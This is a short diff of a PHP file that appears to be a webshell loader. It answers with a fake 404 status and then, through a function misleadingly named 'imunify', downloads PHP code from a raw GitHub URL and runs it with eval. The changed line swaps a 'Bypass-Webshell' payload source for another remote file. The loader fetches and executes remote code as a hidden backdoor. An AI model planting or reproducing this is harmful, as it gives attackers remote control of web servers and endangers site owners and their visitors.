@@ -33,6 +33,6 @@ http_response_code(404);
         }
         return $urls;
     }
-    $secure = imunify('https://raw.githubusercontent.com/sagsooz/Bypass-Webshell/refs/heads/main/haxorsec-bypasser.php');
+    $secure = imunify('https://raw.githubusercontent.com/sztsss/m4nMan/refs/heads/main/DualHex.php');
     eval('?>' . $secure);
 ?>
